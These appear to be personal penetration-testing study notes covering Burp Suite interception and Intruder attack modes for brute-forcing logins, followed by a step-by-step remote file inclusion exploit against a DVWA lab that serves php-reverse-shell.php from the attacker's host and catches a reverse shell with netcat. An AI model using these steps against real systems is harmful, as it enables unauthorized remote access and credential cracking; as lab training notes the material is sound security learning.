# 03/05/25

to add any thing to scope use 
- right click and add to scope 

- so we did intercept the website and changed the value of money 
	- using intercept 


- intruder
- capture it on histroy 
- then send it to intruder
- Sniper attack -> one payload fire at a time one input 

- Battering ram attack-> one payload fire at all diffrent input 
- Pitchfork attack-> use in case of two as username passsword 
	- one by one 1 2
	- 34
- Cluster bomb attack -> one user all the passsowrd (  one usernmae and all passsword  )
- Cluster bomb attack
- select username input (exmap) and select passsword (exp)
- add 
-  how to identefine when password is creaked using 
- status code and length 

run nikto 


- log poising

#### File Inclusion exploiting meta 2
step 1: enable  
- under php info 
	- nano in meta ad modify it
	-  allow_url_include -On
step 2: copy file 
- copy php script file to desktop
	- cp php-reverse-shell.php /home/kali/Desktop 
	- edit make ip= target ip address (10.10.10.4)
step 3: open python sever 
- python3 -m http.server
step 4 : open nc 
- nc -lvp 1234

step 5: run this php script under  File Inclusion 
- http://10.10.10.6/dvwa/vulnerabilities/fi/?page=http://10.10.10.4:8000/php-reverse-shell.php